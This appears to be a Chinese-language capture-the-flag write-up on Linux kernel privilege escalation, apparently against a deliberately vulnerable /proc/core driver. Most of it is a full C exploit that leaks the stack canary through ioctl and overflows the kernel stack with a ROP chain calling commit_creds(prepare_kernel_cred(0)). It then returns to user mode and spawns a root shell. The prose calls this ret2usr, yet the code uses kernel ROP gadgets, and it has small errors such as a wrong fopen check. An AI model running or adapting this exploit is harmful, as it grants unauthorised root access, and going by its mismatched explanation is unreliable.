用户空间的进程不能访问内核空间，但内核空间能访问用户空间 这个特性来定向内核代码或数据流指向用户控件，以 ring 0 特权执行用户空间代码完成提权等操作。
这个方法其实跟上面所说的ROP基本没有区别，最根本的区别就是把上面所需要rop构造出来的提权过程commit_creds(prepare_kernel_cred(0))直接写了一个函数，从而不需要rop调用，直接调用函数即可。

ret2usr 做法中，直接返回到用户空间构造的 commit_creds(prepare_kernel_cred(0))（通过函数指针实现）来提权，虽然这两个函数位于内核空间，但此时我们是 ring 0 特权，因此可以正常运行。之后也是通过 swapgs; iretq 返回到用户态来执行用户空间的 system("/bin/sh")

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void spawn_shell()
{
	if(!getuid())
	{
		system("/bin/sh");
	}
	else
	{
		puts("[*]spawn shell error!");
	}
	exit(0);
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;

size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf,0x30,kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			char hex[20] = {0};
			strncpy(hex,buf,16);
			sscanf(hex,"%llx",&commit_creds);
			printf("commit_creds addr: %p\n",commit_creds);
			vmlinux_base = commit_creds - 0x9c8e0;
			printf("vmlinux_base addr: %p",vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			char hex[20] = {0};
			strncpy(hex,buf,16);
			sscanf(hex,"%llx",&prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p",prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9cce0;
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__(
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		);
	puts("[*]status has been saved.");
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n",idx);
	ioctl(fd,0x6677889C,idx);
}

void core_read(int fd,char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd,0x6677889B,buf);
}

void core_copy_func(int fd,long long size)
{
	printf("[*]copy from user with size: %ld\n",size);
	ioctl(fd,0x6677889A,size);
}

int main(){
	save_status();
	int fd = open("/proc/core",2);
	if(fd < 0)
	{
		puts("[*]open /proc/core error!");
		exit(0);
	}

	find_symbols();

	ssize_t offset = vmlinux_base - raw_vmlinux_base;

	set_off(fd,0x40);

	char buf[0x40] = {0};
	core_read(fd,buf);
	size_t canary = ((size_t *)buf)[0];
	printf("[+]canary: %p\n", canary);

	size_t rop[0x1000] = {0};

	int i;
	for(i = 0;i < 10;i++)
	{
		rop[i] = canary;
	}
	rop[i++] = 0xffffffff81000b2f + offset;  //pop rdi ; ret
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)

	rop[i++] = 0xffffffff81021e53 + offset; //pop rcx ; ret
	rop[i++] = commit_creds;
	rop[i++] = 0xffffffff811ae978 + offset; //mov rdi, rax; jmp rcx

	rop[i++] = 0xffffffff81a012da + offset; //swapgs ; popfq ; ret
	rop[i++] = 0;
	rop[i++] = 0xffffffff81050ac2 + offset; //iretq ; ret

	rop[i++] = (size_t)spawn_shell; //rip
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	write(fd,rop,0x800);
	core_copy_func(fd,0xffffffffffff0000 | (0x100));

	return 0;
}
```

